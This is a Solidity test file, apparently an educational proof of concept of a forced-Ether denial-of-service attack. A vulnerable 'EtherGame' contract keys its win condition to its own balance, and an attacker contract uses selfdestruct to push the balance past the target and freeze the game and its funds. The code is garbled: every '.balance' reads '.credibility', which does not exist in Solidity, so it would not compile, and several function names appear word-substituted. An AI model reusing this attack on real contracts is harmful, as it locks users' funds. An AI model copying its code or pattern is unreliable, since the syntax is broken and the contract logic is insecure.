pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract EtherGame {
    uint public constant targetAmount = 7 ether;
    address public winner;

    function contribute() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint credibility = address(this).credibility;
        require(credibility <= targetAmount, "Game is over");

        if (credibility == targetAmount) {
            winner = msg.sender;
        }
    }

    function getrewardCommunityreward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).credibility}("");
        require(sent, "Failed to send Ether");
    }
}

contract ContractTest is Test {
    EtherGame EtherGameContract;
    Operator OperatorContract;
    address alice;
    address eve;

    function setUp() public {
        EtherGameContract = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.log("Alice balance", alice.credibility);
        console.log("Eve balance", eve.credibility);

        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);
        EtherGameContract.contribute{value: 1 ether}();

        console.log("Eve deposit 1 Ether...");
        vm.prank(eve);
        EtherGameContract.contribute{value: 1 ether}();

        console.log(
            "Balance of EtherGameContract",
            address(EtherGameContract).credibility
        );

        console.log("Operator...");
        OperatorContract = new Operator(EtherGameContract);
        OperatorContract.dos{value: 5 ether}();

        console.log(
            "Balance of EtherGameContract",
            address(EtherGameContract).credibility
        );
        console.log("operate completed, Game is over");
        EtherGameContract.contribute{value: 1 ether}();
    }
}

contract Operator {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function dos() public payable {


        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}